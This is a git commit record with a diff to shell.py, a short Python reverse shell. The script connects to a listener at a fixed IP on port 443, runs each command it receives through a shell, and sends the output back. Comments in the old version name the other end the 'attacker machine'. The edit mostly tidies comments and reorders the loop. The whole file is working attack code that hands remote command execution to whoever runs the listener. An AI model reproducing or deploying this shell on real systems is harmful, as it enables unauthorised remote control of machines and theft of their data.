3020873c4a479ca61f01954b34fb8d4616f79c4f
Stephen Harris <trackmastersteve@users.noreply.github.com>
2018-09-05 20:32:47 -0700

    Update shell.py

--- shell.py
+++ shell.py
@@ -1,20 +1,21 @@
 #!/usr/bin/python
 
-import socket,subprocess
+import socket
+import subprocess
 
-HOST = '192.168.1.1' # The remote host
-PORT = 443 # The same port as used by the server
+HOST = '192.168.1.1' # The ip of the listener.
+PORT = 443 # The same port as listener.
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT)) # Connect to attacker machine
-s.send('[*] Connection Established!') # Send we are connected
+s.connect((HOST, PORT)) # Connect to listener.
+s.send('[*] Connection Established!') # Send connection confirmation.
 
-while 1: # Start loop
-    data = s.recv(1024)# Recieve shell command
+while 1: # Start loop.
+    data = s.recv(1024) # Recieve shell command.
+    # Run shell command.
+    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+    stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
+    s.send(stdout_value) # Send output to listener.
     if data == "quit": 
-        break# If its quit, then break out and close socket
-
-    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # Run shell command
-    stdout_value = proc.stdout.read() + proc.stderr.read() # Read output
-    s.send(stdout_value) # Send output to attacker
-
-s.close() # Close socket
+        break # If its quit, then break out and close socket.
+s.close() # Close socket.
